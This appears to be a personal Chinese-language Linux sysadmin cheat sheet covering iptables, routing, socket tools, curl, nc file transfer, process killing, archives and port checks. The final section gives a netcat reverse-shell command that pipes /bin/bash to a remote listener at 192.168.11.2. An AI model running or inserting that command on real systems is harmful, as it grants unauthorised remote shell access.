# 网络

```sh
# 添加IPtables路由规则
iptables -I INPUT -p tcp -s ip --dport port -j ACCEPT
# 添加默认路由
route add -net 0.0.0.0/24  gw 192.168.18.2 em1
route del  default gw 192.168.18.2 # 删除默认路由
```

## 访问socket

```json
# 通过ss展示网络开放端口
ss -l

ss dst ip:prt|proctol

ncat -U /tmp/tbsocket1

socat -d -d TCP-LISTEN:8080,fork UNIX /
```

参考:

[/how-to-access-unix-domain-sockets-from-the-command-line](https://stackoverflow.com/questions/27195677/how-to-access-unix-domain-sockets-from-the-command-line)

## curl
```sh
# curl发送json
curl -H "Content-Type: application/json" --data @body.json http://localhost:8080/ui/webapp/conf
```


## nc传文件
```sh
#bash 需安装netcat
$ ./nc.exe -v 192.168.18.96 6666 < F:\\AntiyProjects\\src\\ng8w_3.6.5\\comps.py
bogon [192.168.18.96] 6666 (?) open

# 96 使用
[root@bogon python]# nc -v  -l  6666 > comps.py
Connection from 192.168.19.31 port 6666 [tcp/ircu-2] accepted
```



# 进程

## 根据端口号杀进程
```sh
netstat -ntulp
[17:18:40][root@pta-23b7fdb2a2b2407f:~]# netstat -ntulp|grep 127.0.0.*|grep python
[17:19:10][root@pta-23b7fdb2a2b2407f:~]# ps aux|grep 13386
[17:19:18][root@pta-23b7fdb2a2b2407f:~]# kill -9 13386
```

# 文件

## 解压与查看
```sh
# 不解压显示文件列表
tar -tvf *.tgz|*.tar
unzip -l *.zip

# 不解压查看文件内容
zcat *.zip
```
## 分割文件
```sh
split -b fsize fname -d -a 2 prefix_
```


## 检测远程端口是否打开
```shell
telnet ip port
nmap ip -p port 
nc -v host port
```

## nc反向shell

```sh
反向 shell
在服务端访问客户端的 shell

服务器 192.168.11.2 访问本地 shell:

在服务器上: nc -l 1234
在本机: nc 192.168.11.2 1234 -e /bin/bash
```

[nc常用命令](https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/netcat-usage/)